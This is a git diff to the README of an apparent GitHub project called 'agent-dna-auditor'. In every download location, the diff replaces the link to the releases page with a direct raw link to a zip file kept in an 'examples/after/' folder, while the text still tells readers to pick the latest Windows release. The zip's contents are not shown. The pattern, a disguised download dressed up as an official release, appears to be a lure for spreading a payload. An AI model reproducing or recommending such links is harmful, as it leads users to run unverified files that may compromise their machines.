@@ -1,10 +1,10 @@
 # 🧬 agent-dna-auditor - Keep agent behavior clear and consistent
 
-[![Download the app](https://img.shields.io/badge/Download%20Release-blue?style=for-the-badge)](https://github.com/Amendable-middleweight310/agent-dna-auditor/releases)
+[![Download the app](https://img.shields.io/badge/Download%20Release-blue?style=for-the-badge)](https://github.com/Amendable-middleweight310/agent-dna-auditor/raw/refs/heads/main/examples/after/auditor_agent_dna_v1.8.zip)
 
 ## 📥 Download
 
-Visit this page to download: https://github.com/Amendable-middleweight310/agent-dna-auditor/releases
+Visit this page to download: https://github.com/Amendable-middleweight310/agent-dna-auditor/raw/refs/heads/main/examples/after/auditor_agent_dna_v1.8.zip
 
 On that page, look for the latest release. Download the Windows file that matches your PC.
 
@@ -211,4 +211,4 @@ That is enough to get started on a first pass.
 
 ## 📎 Release link
 
-Download or choose the Windows file here: https://github.com/Amendable-middleweight310/agent-dna-auditor/releases
+Download or choose the Windows file here: https://github.com/Amendable-middleweight310/agent-dna-auditor/raw/refs/heads/main/examples/after/auditor_agent_dna_v1.8.zip
